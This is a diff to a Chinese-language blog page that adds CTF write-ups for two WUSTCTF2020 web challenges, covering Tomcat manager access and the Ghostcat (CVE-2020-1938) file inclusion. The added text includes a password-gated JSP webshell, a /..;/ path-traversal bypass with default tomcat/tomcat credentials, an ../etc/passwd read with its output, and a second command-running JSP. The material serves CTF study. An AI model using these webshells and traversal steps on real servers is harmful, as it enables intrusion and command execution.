@@ -65,6 +65,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" href="/2020/04/03/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" href="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -87,7 +89,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -113,7 +115,7 @@
       
         <time datetime="2020-04-01T14:00:37.000Z" itemprop="datePublished">2020-04-01</time>
         
-        (Updated: <time datetime="2020-04-01T14:16:25.789Z" itemprop="dateModified">2020-04-01</time>)
+        (Updated: <time datetime="2020-04-03T14:15:51.262Z" itemprop="dateModified">2020-04-03</time>)
         
       
     </div>
@@ -153,6 +155,71 @@
 <p>判断后缀名是否在白名单中使用了<code>$filename[count($filename) - 1]</code>，而最后字符合成文件名的时候使用了<code>end($filename)</code>。两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。可以通过数组绕过：</p>
 <p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p>
 <p>在跟目录得到flag</p>
+<h3 id="0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="0x 02 [WUSTCTF2020]Train Yourself To Be Godly"></a>0x 02 [WUSTCTF2020]Train Yourself To Be Godly</h3><ul>
+<li><p>考点</p>
+<p>tomcat解析漏洞</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>补充知识：apache中的tomcat/webapps目录如下</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/GnhzdO.png" alt></p>
+<p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传</p>
+<p>URL路径参数不规范引发的问题:</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/Gn4FSA.png" alt></p>
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+<p>文章告诉我们可以通过 /..;/manager/html 进入到manager页面</p>
+<ol>
+<li>随便加一串路径，根据报错信息得知当前的tomcat的root路径为examlpes</li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204510802.png" alt></p>
+<ol start="2">
+<li>访问<code>/..;/manager/html</code>目录穿越到 manager 需要输入密码验证，这里是弱密码 tomcat/tomcat</li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204629584.png" alt></p>
+<p>接下来是后台getshell过程，webshell构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>jar cvf lxj.war webshell.jsp</code>命令将webshell.jsp打包成war,然后上传文件，发现回显404，根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试。接着会发现401，未授权访问。是缺少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br> <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>后面就是tomcat:tomcat的base64编码。继续上传，发现403。一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205226924.png" alt></p>
+<p>最后访问webshell，得到flag</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205311373.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves</a></p>
+<p><a href="https://www.jianshu.com/p/368d6c41a2f6" target="_blank" rel="noopener">https://www.jianshu.com/p/368d6c41a2f6</a></p>
+</blockquote>
+<h3 id="0x-03-WUSTCTF2020-easyweb"><a href="#0x-03-WUSTCTF2020-easyweb" class="headerlink" title="0x 03 [WUSTCTF2020]easyweb"></a>0x 03 [WUSTCTF2020]easyweb</h3><ul>
+<li><p>考点</p>
+<p>CVE-2020-1938幽灵猫文件包含</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>题目打开是一个文件上传，传一个文件上传上去会返回一个之前上传的文件下载，经过测试发现此处存在任意文件读取，可以随意下载：</li>
+</ol>
+<p>尝试WEB-INF下的web.xml:<code>/download?file=../web.xml</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;webAppRootKey&lt;&#x2F;param-name&gt;</span><br><span class="line">        &lt;param-value&gt;tomcat.ajp&lt;&#x2F;param-value&gt;</span><br><span class="line">    &lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;</span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        &lt;&#x2F;listener-class&gt;</span><br><span class="line">    &lt;&#x2F;listener&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">    &lt;&#x2F;welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;error-page&gt;</span><br><span class="line">        &lt;exception-type&gt;java.lang.Throwable&lt;&#x2F;exception-type&gt;</span><br><span class="line">        &lt;location&gt;&#x2F;error&lt;&#x2F;location&gt;</span><br><span class="line">    &lt;&#x2F;error-page&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试读取/etc/passwd:<code>/download?file=../../../../../../../etc/passwd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:101:101::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:102:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+
+<p>使用CVE-2020-1938exp（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面</a></p>
+<blockquote>
+<p>注意由于靶机在内网，所以IP地址是根据Lan Domain确定的，外网IP是内网穿透绑定的</p>
+</blockquote>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221242014.png" alt></p>
+<p>构造exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功后利用文件包含执行木马，最后<code>cat /flag78bt787it8b9b098j0k80k0ggg</code>得到flag</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221421718.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p>
+<p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p>
+</blockquote>
 
   </div>
 </article>
@@ -180,7 +247,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
